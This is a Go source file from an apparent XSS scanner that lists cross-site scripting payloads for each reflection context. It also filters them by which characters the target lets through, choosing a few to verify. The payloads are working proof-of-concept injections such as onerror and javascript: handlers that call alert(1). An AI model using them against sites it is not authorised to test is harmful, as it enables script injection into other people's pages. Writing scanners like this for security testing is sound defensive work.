package xss

import "strings"

// contextPayloads maps context types to their corresponding XSS exploit payloads.
// Each context has a list of payloads ordered by effectiveness and simplicity.
// Payloads are filtered based on available characters before being returned.
var contextPayloads = map[ContextType][]string{
	ContextHTMLBody: {
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<svg><script>alert(1)</script></svg>",
		"<script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<iframe src=javascript:alert(1)>",
	},
	ContextHTMLAttributeQuoted: {
		"\" onload=alert(1) x=\"",
		"' onload=alert(1) x='",
		"\"><img src=x onerror=alert(1)>",
		"\" autofocus onfocus=alert(1) x=\"",
		"\"><svg onload=alert(1)>",
	},
	ContextHTMLAttributeUnquoted: {
		"onload=alert(1) x=",
		"><img src=x onerror=alert(1)>",
		"autofocus onfocus=alert(1) x=",
	},
	ContextScriptString: {
		"';alert(1);//",
		"\";alert(1);//",
		"</script><script>alert(1)</script>",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
	},
	ContextScriptBlock: {
		"alert(1)",
		";alert(1);//",
		";alert(1);",
	},
	ContextScriptTemplateLiteral: {
		"${alert(1)}",
		"`+alert(1)+`",
		"${alert`1`}",
	},
	ContextHTMLComment: {
		"--><img src=x onerror=alert(1)>",
		"--!><img src=x onerror=alert(1)>",
	},
	ContextStyleBlock: {
		"</style><script>alert(1)</script>",
		"</style><img src=x onerror=alert(1)>",
	},
	ContextURLAttribute: {
		"javascript:alert(1)",
		"javascript:alert`1`",
		"javascript:alert(document.domain)",
		"data:text/html,<script>alert(1)</script>",
	},
}

// SelectPayloads returns a filtered list of XSS payloads appropriate for the given
// reflection context. It selects payloads based on context type, then filters them
// by available characters. The max_verification_attempts parameter (default: 3)
// limits the number of payloads returned to avoid excessive verification attempts.
//
// Returns up to max_verification_attempts payloads, or all available if fewer.
func SelectPayloads(reflection ReflectionInfo, params map[string]interface{}) []string {
	payloads := contextPayloads[reflection.Context]
	if payloads == nil {
		return nil
	}

	filtered := filterByAvailableChars(payloads, reflection.AvailableChars, reflection.Context)

	maxAttempts := 3
	switch v := params["max_verification_attempts"].(type) {
	case int:
		if v > 0 {
			maxAttempts = v
		}
	case float64:
		if v > 0 {
			maxAttempts = int(v)
		}
	}

	if len(filtered) > maxAttempts {
		return filtered[:maxAttempts]
	}

	return filtered
}

// filterByAvailableChars filters payloads to only include those that can be used
// with the available character set. Payloads requiring filtered characters are
// excluded. Returns filtered list of usable payloads.
func filterByAvailableChars(payloads []string, chars CharacterSet, context ContextType) []string {
	var result []string

	for _, payload := range payloads {
		if canUsePayload(payload, chars, context) {
			result = append(result, payload)
		}
	}

	return result
}

// canUsePayload checks if a payload can be used in the given context with the
// available characters. It validates that all required characters for the payload
// (based on context requirements) are present in the CharacterSet. Returns true
// if payload is usable, false otherwise.
func canUsePayload(payload string, chars CharacterSet, context ContextType) bool {
	if context == ContextHTMLBody {
		if !chars.LessThan || !chars.GreaterThan {
			return false
		}
	}

	if strings.Contains(payload, "<") && !chars.LessThan {
		return false
	}
	if strings.Contains(payload, ">") && !chars.GreaterThan {
		return false
	}

	if strings.Contains(payload, "\"") && !chars.DoubleQuote {
		return false
	}
	if strings.Contains(payload, "'") && !chars.SingleQuote {
		return false
	}

	if strings.Contains(payload, "/") && !chars.Slash {
		return false
	}

	if strings.Contains(payload, "`") && !chars.Backtick {
		return false
	}

	return true
}
